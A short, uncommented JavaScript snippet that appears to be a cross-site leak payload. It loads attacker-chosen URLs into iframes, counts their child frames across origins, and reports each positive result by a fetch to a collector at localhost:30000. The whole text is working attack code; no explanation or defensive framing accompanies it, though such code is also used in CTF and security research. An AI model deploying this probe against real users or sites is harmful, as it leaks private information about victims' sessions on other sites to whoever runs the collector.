window.addEventListener('load', () => {
  let divs = document.getElementsByTagName("div");
  for (let div of divs) {
    let f = document.createElement("iframe");
    console.log(f);
    f.id = div.id;
    f.src = div.className;
    f.addEventListener("load", () => {
      if (f.contentWindow.length !== 0) {
        var tmp = 'http://localhost:30000/' + f.id;
        fetch(tmp);
      }
    }, false);
    document.getElementsByTagName('body')[0].appendChild(f);
  }
}, false);
